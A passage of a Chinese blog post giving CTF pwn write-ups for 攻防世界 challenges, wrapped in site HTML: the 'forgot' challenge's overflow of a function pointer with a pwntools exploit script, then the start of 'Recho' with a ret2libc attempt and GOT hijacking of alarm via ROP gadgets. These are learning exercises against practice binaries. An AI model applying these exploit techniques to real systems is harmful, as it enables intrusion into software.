<!DOCTYPE html><html lang="en" data-theme="light"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width,initial-scale=1"><title>攻防世界刷题-1 | 墨水彩笔</title><meta name="author" content="徐小宇"><meta name="copyright" content="徐小宇"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="#ffffff"><meta http-equiv="Cache-Control" content="no-transform"><meta http-equiv="Cache-Control" content="no-siteapp"><meta name="description" content="forgotchecksec和查看运行流程 32位的程序，半开的RELRO和全开的NX  程序中有两次输入，第一次输入后有一个类似于地址的回显，然后进入第二次输入 利用IDA分析 看起来是一个挺复杂的结构 我们看到第一次的输入是由严格限制的，并没有溢出 但第二次的输入没有限制边界，所以可能存在溢出漏洞 123456789101112131415161718192021222324252627282">
<meta property="og:type" content="article">
<meta property="og:title" content="攻防世界刷题-1">
<meta property="og:url" content="http://example.com/2021/08/31/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C%E5%88%B7%E9%A2%98-1/index.html">
<meta property="og:site_name" content="墨水彩笔">
<meta property="og:description" content="forgotchecksec和查看运行流程 32位的程序，半开的RELRO和全开的NX  程序中有两次输入，第一次输入后有一个类似于地址的回显，然后进入第二次输入 利用IDA分析 看起来是一个挺复杂的结构 我们看到第一次的输入是由严格限制的，并没有溢出 但第二次的输入没有限制边界，所以可能存在溢出漏洞 123456789101112131415161718192021222324252627282">
<meta property="og:locale" content="en_US">
<meta property="og:image" content="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1/img/default.jpg">
<meta property="article:published_time" content="2021-08-31T07:42:29.000Z">
<meta property="article:modified_time" content="2021-09-22T09:25:27.683Z">
<meta property="article:author" content="徐小宇">
<meta name="twitter:card" content="summary">
<meta name="twitter:image" content="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1/img/default.jpg"><link rel="shortcut icon" href="/img/favicon.png"><link rel="canonical" href="http://example.com/2021/08/31/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C%E5%88%B7%E9%A2%98-1/"><link rel="preconnect" href="//cdn.jsdelivr.net"/><link rel="preconnect" href="//busuanzi.ibruce.info"/><link rel="stylesheet" href="/css/index.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free/css/all.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@latest/dist/jquery.fancybox.min.css"><script>var GLOBAL_CONFIG = { 
  root: '/',
  hexoversion: '5.2.0',
  algolia: undefined,
  localSearch: undefined,
  translate: undefined,
  noticeOutdate: undefined,
  highlight: {"plugin":"highlighjs","highlightCopy":true,"highlightLang":true},
  copy: {
    success: 'Copy successfully',
    error: 'Copy error',
    noSupport: 'The browser does not support'
  },
  relativeDate: {
    homepage: false,
    post: false
  },
  runtime: '',
  date_suffix: {
    just: 'Just',
    min: 'minutes ago',
    hour: 'hours ago',
    day: 'days ago',
    month: 'months ago'
  },
  copyright: undefined,
  ClickShowText: undefined,
  lightbox: 'fancybox',
  Snackbar: undefined,
  justifiedGallery: {
    js: 'https://cdn.jsdelivr.net/npm/justifiedGallery/dist/js/jquery.justifiedGallery.min.js',
    css: 'https://cdn.jsdelivr.net/npm/justifiedGallery/dist/css/justifiedGallery.min.css'
  },
  isPhotoFigcaption: false,
  islazyload: false,
  isanchor: false
};

var saveToLocal = {
  set: function setWithExpiry(key, value, ttl) {
    const now = new Date()
    const expiryDay = ttl * 86400000
    const item = {
      value: value,
      expiry: now.getTime() + expiryDay,
    }
    localStorage.setItem(key, JSON.stringify(item))
  },

  get: function getWithExpiry(key) {
    const itemStr = localStorage.getItem(key)

    if (!itemStr) {
      return undefined
    }
    const item = JSON.parse(itemStr)
    const now = new Date()

    if (now.getTime() > item.expiry) {
      localStorage.removeItem(key)
      return undefined
    }
    return item.value
  }
}</script><script id="config_change">var GLOBAL_CONFIG_SITE = { 
  isPost: true,
  isHome: false,
  isHighlightShrink: false,
  isSidebar: true,
  postUpdate: '2021-09-22 17:25:27'
}</script><noscript><style type="text/css">
  #nav {
    opacity: 1
  }
  .justified-gallery img {
    opacity: 1
  }

  #recent-posts time,
  #post-meta time {
    display: inline !important
  }
</style></noscript><script>(function () {
  window.activateDarkMode = function () {
    document.documentElement.setAttribute('data-theme', 'dark')
    if (document.querySelector('meta[name="theme-color"]') !== null) {
      document.querySelector('meta[name="theme-color"]').setAttribute('content', '#0d0d0d')
    }
  }
  window.activateLightMode = function () {
    document.documentElement.setAttribute('data-theme', 'light')
    if (document.querySelector('meta[name="theme-color"]') !== null) {
      document.querySelector('meta[name="theme-color"]').setAttribute('content', '#ffffff')
    }
  }

  const autoChangeMode = 'false'
  const t = saveToLocal.get('theme')
  if (autoChangeMode === '1') {
    const isDarkMode = window.matchMedia('(prefers-color-scheme: dark)').matches
    const isLightMode = window.matchMedia('(prefers-color-scheme: light)').matches
    const isNotSpecified = window.matchMedia('(prefers-color-scheme: no-preference)').matches
    const hasNoSupport = !isDarkMode && !isLightMode && !isNotSpecified

    if (t === undefined) {
      if (isLightMode) activateLightMode()
      else if (isDarkMode) activateDarkMode()
      else if (isNotSpecified || hasNoSupport) {
        const now = new Date()
        const hour = now.getHours()
        const isNight = hour <= 6 || hour >= 18
        isNight ? activateDarkMode() : activateLightMode()
      }
      window.matchMedia('(prefers-color-scheme: dark)').addListener(function (e) {
        if (saveToLocal.get('theme') === undefined) {
          e.matches ? activateDarkMode() : activateLightMode()
        }
      })
    } else if (t === 'light') activateLightMode()
    else activateDarkMode()
  } else if (autoChangeMode === '2') {
    const now = new Date()
    const hour = now.getHours()
    const isNight = hour <= 6 || hour >= 18
    if (t === undefined) isNight ? activateDarkMode() : activateLightMode()
    else if (t === 'light') activateLightMode()
    else activateDarkMode()
  } else {
    if (t === 'dark') activateDarkMode()
    else if (t === 'light') activateLightMode()
  }
})()</script><meta name="generator" content="Hexo 5.2.0"></head><body><div id="mobile-sidebar"><div id="menu_mask"></div><div id="mobile-sidebar-menus"><div class="mobile_author_icon"><img class="avatar-img" src="/null" onerror="onerror=null;src='/img/friend_404.gif'" alt="avatar"/></div><div class="mobile_post_data"><div class="mobile_data_item is-center"><div class="mobile_data_link"><a href="/archives/"><div class="headline">Articles</div><div class="length_num">40</div></a></div></div></div><hr/></div></div><div id="body-wrap"><div id="sidebar"><i class="fas fa-arrow-right on" id="toggle-sidebar"></i><div class="sidebar-toc"><div class="sidebar-toc__title">Catalog</div><div class="sidebar-toc__progress"><span class="progress-notice">You've read</span><span class="progress-num">0</span><span class="progress-percentage">%</span><div class="sidebar-toc__progress-bar">     </div></div><div class="sidebar-toc__content"><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#forgot"><span class="toc-number">1.</span> <span class="toc-text">forgot</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#checksec%E5%92%8C%E6%9F%A5%E7%9C%8B%E8%BF%90%E8%A1%8C%E6%B5%81%E7%A8%8B"><span class="toc-number">1.1.</span> <span class="toc-text">checksec和查看运行流程</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%88%A9%E7%94%A8IDA%E5%88%86%E6%9E%90"><span class="toc-number">1.2.</span> <span class="toc-text">利用IDA分析</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%9E%84%E6%80%9D"><span class="toc-number">1.3.</span> <span class="toc-text">构思</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#EXP"><span class="toc-number">1.4.</span> <span class="toc-text">EXP</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Recho"><span class="toc-number">2.</span> <span class="toc-text">Recho</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#checksec%E5%B9%B6%E6%9F%A5%E7%9C%8B%E8%BF%90%E8%A1%8C%E6%B5%81%E7%A8%8B"><span class="toc-number">2.1.</span> <span class="toc-text">checksec并查看运行流程</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%88%A9%E7%94%A8IDA%E6%9F%A5%E7%9C%8B"><span class="toc-number">2.2.</span> <span class="toc-text">利用IDA查看</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%AC%AC%E4%B8%80%E6%AC%A1%E6%9E%84%E6%80%9D"><span class="toc-number">2.3.</span> <span class="toc-text">第一次构思</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%80%9F%E9%89%B4"><span class="toc-number">2.4.</span> <span class="toc-text">借鉴</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#EXP-1"><span class="toc-number">2.5.</span> <span class="toc-text">EXP</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%80%BB%E7%BB%93"><span class="toc-number">2.6.</span> <span class="toc-text">总结</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#warmup"><span class="toc-number">3.</span> <span class="toc-text">warmup</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E9%A2%98%E7%9B%AE%E4%BB%8B%E7%BB%8D"><span class="toc-number">3.1.</span> <span class="toc-text">题目介绍</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%9E%84%E6%80%9D-1"><span class="toc-number">3.2.</span> <span class="toc-text">构思</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#EXP-2"><span class="toc-number">3.3.</span> <span class="toc-text">EXP</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#welpwn"><span class="toc-number">4.</span> <span class="toc-text">welpwn</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#checksec%E5%B9%B6%E6%9F%A5%E7%9C%8B%E8%BF%90%E8%A1%8C%E6%B5%81%E7%A8%8B-1"><span class="toc-number">4.1.</span> <span class="toc-text">checksec并查看运行流程</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%88%A9%E7%94%A8IDA%E6%9F%A5%E7%9C%8B%E5%88%86%E6%9E%90"><span class="toc-number">4.2.</span> <span class="toc-text">利用IDA查看分析</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%AC%AC%E4%B8%80%E6%AC%A1%E5%B0%9D%E8%AF%95"><span class="toc-number">4.2.1.</span> <span class="toc-text">第一次尝试</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%9F%A5%E8%AF%86%E7%82%B9"><span class="toc-number">4.3.</span> <span class="toc-text">知识点</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%AC%AC%E4%BA%8C%E6%AC%A1%E5%B0%9D%E8%AF%95"><span class="toc-number">4.3.1.</span> <span class="toc-text">第二次尝试</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%80%9F%E9%89%B4-DynELF%E5%81%9A%E6%B3%95"><span class="toc-number">4.4.</span> <span class="toc-text">借鉴-DynELF做法</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%B3%A8%E6%84%8F%E7%82%B9"><span class="toc-number">4.4.1.</span> <span class="toc-text">注意点</span></a></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#greeting-150"><span class="toc-number">5.</span> <span class="toc-text">greeting-150</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#checksec%E5%92%8C%E6%9F%A5%E7%9C%8B%E8%BF%90%E8%A1%8C%E6%B5%81%E7%A8%8B-1"><span class="toc-number">5.1.</span> <span class="toc-text">checksec和查看运行流程</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%88%A9%E7%94%A8IDA%E5%88%86%E6%9E%90-1"><span class="toc-number">5.2.</span> <span class="toc-text">利用IDA分析</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%B0%9D%E8%AF%95"><span class="toc-number">5.3.</span> <span class="toc-text">尝试</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%80%9F%E9%89%B4-1"><span class="toc-number">5.4.</span> <span class="toc-text">借鉴</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#EXP-3"><span class="toc-number">5.5.</span> <span class="toc-text">EXP</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%B0%8F%E6%8A%80%E5%B7%A7"><span class="toc-number">5.5.1.</span> <span class="toc-text">小技巧</span></a></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#secret-file"><span class="toc-number">6.</span> <span class="toc-text">secret_file</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#checksec%E5%B9%B6%E6%9F%A5%E7%9C%8B%E8%BF%90%E8%A1%8C%E6%B5%81%E7%A8%8B-2"><span class="toc-number">6.1.</span> <span class="toc-text">checksec并查看运行流程</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%88%A9%E7%94%A8IDA%E6%9F%A5%E7%9C%8B-1"><span class="toc-number">6.2.</span> <span class="toc-text">利用IDA查看</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%9E%84%E6%80%9D-2"><span class="toc-number">6.3.</span> <span class="toc-text">构思</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#EXP-4"><span class="toc-number">6.4.</span> <span class="toc-text">EXP</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%B0%8F%E7%9F%A5%E8%AF%86"><span class="toc-number">6.4.1.</span> <span class="toc-text">小知识</span></a></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link"><span class="toc-number">7.</span> <span class="toc-text"></span></a></li></ol></div></div></div><header class="post-bg" id="page-header" style="background-image: url(https://cdn.jsdelivr.net/npm/butterfly-extsrc@1/img/default.jpg)"><nav id="nav"><span id="blog_name"><a id="site-name" href="/">墨水彩笔</a></span><span id="menus"><span class="close" id="toggle-menu"><a class="site-page"><i class="fas fa-bars fa-fw"></i></a></span></span></nav><div id="post-info"><div id="post-title"><div class="posttitle">攻防世界刷题-1</div></div><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="far fa-calendar-alt fa-fw post-meta-icon"></i><span class="post-meta-label">Created</span><time class="post-meta-date-created" datetime="2021-08-31T07:42:29.000Z" title="Created 2021-08-31 15:42:29">2021-08-31</time><span class="post-meta-separator">|</span><i class="fas fa-history fa-fw post-meta-icon"></i><span class="post-meta-label">Updated</span><time class="post-meta-date-updated" datetime="2021-09-22T09:25:27.683Z" title="Updated 2021-09-22 17:25:27">2021-09-22</time></span></div><div class="meta-secondline"> <span class="post-meta-separator">|</span><span class="post-meta-pv-cv"><i class="far fa-eye fa-fw post-meta-icon"></i><span class="post-meta-label">Post View:</span><span id="busuanzi_value_page_pv"></span></span></div></div></div></header><main class="layout_post" id="content-inner"><article id="post"><div class="post-content" id="article-container"><h1 id="forgot"><a href="#forgot" class="headerlink" title="forgot"></a>forgot</h1><h2 id="checksec和查看运行流程"><a href="#checksec和查看运行流程" class="headerlink" title="checksec和查看运行流程"></a>checksec和查看运行流程</h2><p><img src="https://github.com/xuxiaoyu233/xuxiaoyu233.github.io/blob/picture/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C%E5%88%B7%E9%A2%98-1/image-20210831154335253.png?raw=true" alt="image-20210831154335253.png"></p>
<p>32位的程序，半开的RELRO和全开的NX</p>
<p><img src="https://github.com/xuxiaoyu233/xuxiaoyu233.github.io/blob/picture/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C%E5%88%B7%E9%A2%98-1/image-20210831154429295.png?raw=true" alt="image-20210831154429295.png"></p>
<p>程序中有两次输入，第一次输入后有一个类似于地址的回显，然后进入第二次输入</p>
<h2 id="利用IDA分析"><a href="#利用IDA分析" class="headerlink" title="利用IDA分析"></a>利用IDA分析</h2><p><img src="https://github.com/xuxiaoyu233/xuxiaoyu233.github.io/blob/picture/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C%E5%88%B7%E9%A2%98-1/image-20210831154523551.png?raw=true" alt="image-20210831154523551.png"></p>
<p>看起来是一个挺复杂的结构</p>
<p>我们看到第一次的输入是由严格限制的，并没有溢出</p>
<p>但第二次的输入没有限制边界，所以可能存在溢出漏洞</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><span class="line">for ( i &#x3D; 0; ; ++i )</span><br><span class="line">  &#123;</span><br><span class="line">    v0 &#x3D; i;</span><br><span class="line">    if ( v0 &gt;&#x3D; strlen(v2) )</span><br><span class="line">      break;</span><br><span class="line">    switch ( v5 )</span><br><span class="line">    &#123;</span><br><span class="line">      case 1:</span><br><span class="line">        if ( sub_8048702(v2[i]) )</span><br><span class="line">          v5 &#x3D; 2;</span><br><span class="line">        break;</span><br><span class="line">      case 2:</span><br><span class="line">        if ( v2[i] &#x3D;&#x3D; 64 )</span><br><span class="line">          v5 &#x3D; 3;</span><br><span class="line">        break;</span><br><span class="line">      case 3:</span><br><span class="line">        if ( sub_804874C(v2[i]) )</span><br><span class="line">          v5 &#x3D; 4;</span><br><span class="line">        break;</span><br><span class="line">      case 4:</span><br><span class="line">        if ( v2[i] &#x3D;&#x3D; 46 )</span><br><span class="line">          v5 &#x3D; 5;</span><br><span class="line">        break;</span><br><span class="line">      case 5:</span><br><span class="line">        if ( sub_8048784(v2[i]) )</span><br><span class="line">          v5 &#x3D; 6;</span><br><span class="line">        break;</span><br><span class="line">      case 6:</span><br><span class="line">        if ( sub_8048784(v2[i]) )</span><br><span class="line">          v5 &#x3D; 7;</span><br><span class="line">        break;</span><br><span class="line">      case 7:</span><br><span class="line">        if ( sub_8048784(v2[i]) )</span><br><span class="line">          v5 &#x3D; 8;</span><br><span class="line">        break;</span><br><span class="line">      case 8:</span><br><span class="line">        if ( sub_8048784(v2[i]) )</span><br><span class="line">          v5 &#x3D; 9;</span><br><span class="line">        break;</span><br><span class="line">      case 9:</span><br><span class="line">        v5 &#x3D; 10;</span><br><span class="line">        break;</span><br><span class="line">      default:</span><br><span class="line">        continue;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  ((void (*)(void))v3[--v5])();</span><br><span class="line">  return fflush(stdout);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>接下来就是对我们第二次输入的内容进行一系列的判断了</p>
<p>这里我们注意一个点</p>
<p><img src="https://github.com/xuxiaoyu233/xuxiaoyu233.github.io/blob/picture/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C%E5%88%B7%E9%A2%98-1/image-20210831154706258.png?raw=true" alt="image-20210831154706258.png"></p>
<p>这句话是什么意思</p>
<p>我的理解就是将这里作为指针指向的地方来进行执行，也就是说最后会根据v3和v5的值来一次跳转</p>
<p>那么我们回顾一下v3和v5的值是如何变化的</p>
<p>先看看v3</p>
<p><img src="https://github.com/xuxiaoyu233/xuxiaoyu233.github.io/blob/picture/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C%E5%88%B7%E9%A2%98-1/image-20210831154841422.png?raw=true" alt="image-20210831154841422.png"></p>
<p>自从最初定义以后就没有有关v3的变化了</p>
<p>再看看v5</p>
<p>v5初始的时候被定义为1</p>
<p><img src="https://github.com/xuxiaoyu233/xuxiaoyu233.github.io/blob/picture/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C%E5%88%B7%E9%A2%98-1/image-20210831155008959.png?raw=true" alt="image-20210831155008959.png"></p>
<p>接下里它的变化在对于第二次输入进行判断的时候</p>
<p><img src="https://github.com/xuxiaoyu233/xuxiaoyu233.github.io/blob/picture/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C%E5%88%B7%E9%A2%98-1/image-20210831154915592.png?raw=true" alt="image-20210831154915592.png"></p>
<p>我们深入看看v5是如何变化的</p>
<p>首先对于我们第二次输入的内容进行一个个的判断</p>
<p><img src="https://github.com/xuxiaoyu233/xuxiaoyu233.github.io/blob/picture/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C%E5%88%B7%E9%A2%98-1/image-20210831155053718.png?raw=true" alt="image-20210831155053718.png"></p>
<p>这里的话如果我们的输入是符合任意一个的话就会回显为1，判断成立那么我们的v5就会发送改变</p>
<p>那么我们看看我们的跳转语句</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">((void (*)(void))v3[--v5])();</span><br></pre></td></tr></table></figure>

<p>这个地方v5如果一直不改变的话（也就是一直为1的话）那么最后执行的就是v3【0】</p>
<p>于是乎我们的思路就是如何控制v3[0]指向我们想要跳转的地方</p>
<h2 id="构思"><a href="#构思" class="headerlink" title="构思"></a>构思</h2><p>我们首先看看有没有什么后门函数</p>
<p><img src="https://github.com/xuxiaoyu233/xuxiaoyu233.github.io/blob/picture/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C%E5%88%B7%E9%A2%98-1/image-20210831155325878.png?raw=true" alt="image-20210831155325878.png"></p>
<p>发现一个可以直接出flag的函数</p>
<p>那么我们再想想第二个关键点，如何改变v3[0]的值</p>
<p>我们首先想到是通过溢出来改变，而我们刚刚对于两次输入分析后发现只有第二次输入才会有溢出的可能</p>
<p>那么我们看看栈的静态结构</p>
<p><img src="https://github.com/xuxiaoyu233/xuxiaoyu233.github.io/blob/picture/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C%E5%88%B7%E9%A2%98-1/image-20210831155458090.png?raw=true" alt="image-20210831155458090.png"></p>
<p>我们发现第二次输入的地址在v2里，而我们的v3于v2是相邻的并且我们可以通过使得v2溢出来改变v3的值</p>
<p>那么我们就只剩下最后一个点了那就是如何不改变v5的值，也就是绕过判断</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">a1 &gt; &#39;&#96;&#39; &amp;&amp; a1 &lt;&#x3D; &#39;z&#39; || a1 &gt; &#39;&#x2F;&#39; &amp;&amp; a1 &lt;&#x3D; &#39;9&#39; || a1 &#x3D;&#x3D; &#39;_&#39; || a1 &#x3D;&#x3D; &#39;-&#39; || a1 &#x3D;&#x3D; &#39;+&#39; || a1 &#x3D;&#x3D; &#39;.&#39;;</span><br></pre></td></tr></table></figure>

<p>这个判断的条件如下</p>
<p>1.属于小写字母</p>
<p>2.是数字</p>
<p>3.是四种特殊符号</p>
<p>那么我们填充的时候只要避开这三个条件即可，也就是我们可以使用大写的字母</p>
<h2 id="EXP"><a href="#EXP" class="headerlink" title="EXP"></a>EXP</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line">p &#x3D; remote(&#39;111.200.241.244&#39;,50753)</span><br><span class="line"></span><br><span class="line">flag_addr &#x3D; 0x80486CC</span><br><span class="line"></span><br><span class="line">p.sendlineafter(&#39;&gt; &#39;,&#39;111&#39;)</span><br><span class="line"></span><br><span class="line">p.recvuntil(&#39;&gt; &#39;)</span><br><span class="line"></span><br><span class="line">payload &#x3D; &#39;B&#39;*0x20 + p32(flag_addr)</span><br><span class="line"></span><br><span class="line">p.sendline(payload)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>

<h1 id="Recho"><a href="#Recho" class="headerlink" title="Recho"></a>Recho</h1><h2 id="checksec并查看运行流程"><a href="#checksec并查看运行流程" class="headerlink" title="checksec并查看运行流程"></a>checksec并查看运行流程</h2><p><img src="https://github.com/xuxiaoyu233/xuxiaoyu233.github.io/blob/picture/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C%E5%88%B7%E9%A2%98-1/image-20210831164630775.png?raw=true" alt="image-20210831164630775.png"></p>
<p><img src="https://github.com/xuxiaoyu233/xuxiaoyu233.github.io/blob/picture/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C%E5%88%B7%E9%A2%98-1/image-20210831164702873.png?raw=true" alt="image-20210831164702873.png"></p>
<p>这个程序似乎是个无线循环的程序，并且程序的每一次运行分两次进行</p>
<p>第一次的输入没有打印</p>
<p>第二次输入后会打印输入的内容</p>
<h2 id="利用IDA查看"><a href="#利用IDA查看" class="headerlink" title="利用IDA查看"></a>利用IDA查看</h2><p><img src="https://github.com/xuxiaoyu233/xuxiaoyu233.github.io/blob/picture/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C%E5%88%B7%E9%A2%98-1/image-20210831165042441.png?raw=true" alt="image-20210831165042441.png"></p>
<h2 id="第一次构思"><a href="#第一次构思" class="headerlink" title="第一次构思"></a>第一次构思</h2><p>根据之前的经验我发现程序中存在printf这里函数且又有溢出漏洞，而且还是可以循环的，那么就可以尝试ret2libc</p>
<p>于是乎exp出现 </p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line">#p &#x3D; remote(&#39;111.200.241.244&#39;,54414)</span><br><span class="line">elf &#x3D; ELF(&#39;Recho&#39;)</span><br><span class="line">p &#x3D; process(&#39;Recho&#39;)</span><br><span class="line">context.log_level &#x3D; &#39;debug&#39;</span><br><span class="line">printf_got &#x3D; elf.got[&#39;printf&#39;]</span><br><span class="line">printf_plt &#x3D; elf.plt[&#39;printf&#39;]</span><br><span class="line">pop_rdi &#x3D; 0x00000000004008a3</span><br><span class="line"></span><br><span class="line">p.sendline(&#39;0x200&#39;)</span><br><span class="line">payload &#x3D; &#39;a&#39;*(0x30 + 8) + p64(pop_rdi) + p64(printf_got) + p64(printf_plt) + p64(0)</span><br><span class="line">p.sendline(payload)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>

<p>但刚刚开始调试它就结束了，因为根本什么都泄露不出来</p>
<p>于是我就去借鉴别人的了</p>
<h2 id="借鉴"><a href="#借鉴" class="headerlink" title="借鉴"></a>借鉴</h2><p>首先我没有看到使用ret2libc的解法，他们普遍用的是syscall来劫持alarm</p>
<p>那么我们就借鉴一下其他人的做法吧</p>
<p>我们可以分为下面几个点来一一分析</p>
<p>首先</p>
<p>1.为什么是劫持alarm</p>
<p>2.怎么劫持alarm</p>
<p>3.劫持了要怎么利用</p>
<p>那么我们先看看第一点</p>
<p>alarm出现的地方在最开始的初始化函数中，并且在接下来的程序中没有出现，这也是我们利用它的理由之一，不会破环程序的内容</p>
<p><img src="https://github.com/xuxiaoyu233/xuxiaoyu233.github.io/blob/picture/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C%E5%88%B7%E9%A2%98-1/image-20210831171111890.png?raw=true" alt="image-20210831171111890.png"></p>
<p>接下来既然要劫持got表那么我们就看看got表的内容</p>
<p>这里我们新学到了一个gdb的语句可以查看got表的内容</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">disassemble alarm</span><br></pre></td></tr></table></figure>

<p><img src="https://github.com/xuxiaoyu233/xuxiaoyu233.github.io/blob/picture/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C%E5%88%B7%E9%A2%98-1/image-20210831171329802.png?raw=true" alt="image-20210831171329802.png"></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">#define __NR_alarm 37			--验证了mov eax,0x25的调用号是调用alarm</span><br></pre></td></tr></table></figure>

<p>从这个got表中我们发现syscall的位置离alarm的位置只隔了5字节</p>
<p>那么接下来进入我们的第二点，怎么劫持这个got表呢？</p>
<p>这里我又学到了一个新的知识点，通过修改地址来劫持got表</p>
<p>我们利用语句</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ROPgadget --binary Recho --only &#39;add|ret&#39;</span><br></pre></td></tr></table></figure>

